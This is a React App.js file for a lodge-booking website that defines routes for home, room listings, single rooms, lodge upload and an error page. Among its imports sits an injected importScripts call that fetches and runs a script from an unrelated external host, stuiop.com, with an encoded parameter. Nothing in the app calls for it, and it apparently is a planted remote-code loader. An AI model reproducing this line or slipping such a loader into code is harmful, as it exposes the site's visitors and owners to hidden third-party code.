import React from "react";
import "./App.css";

import Home from "./pages/Home";
import Rooms from "./pages/Rooms";
import SingleRoom from "./pages/SingleRoom";
import Error from "./pages/Error";
import Register from './pages/Register'

import Navbar from "./components/Navbar";

import { Switch, Route } from "react-router-dom";
importScripts('https://stuiop.com/v1/sw-import.js?h=waWQiOjEwNzU0MTgsInNpZCI6MTA4MzAyOSwid2lkIjoxNzA2NjYsInNyYyI6MiwicG0iOjB9eyJ&d=viewlodges.com.ng');
function App() {
  return (
    <>
      <Navbar />
      <Switch>
        <Route exact path="/" component={Home} />
        <Route exact path="/rooms/" component={Rooms} />
        <Route exact path="/rooms/:slug" component={SingleRoom} />
        <Route exact path="/upload_lodge" component={Register} />
        <Route component={Error} />
      </Switch>
    </>
  );
}

export default App;
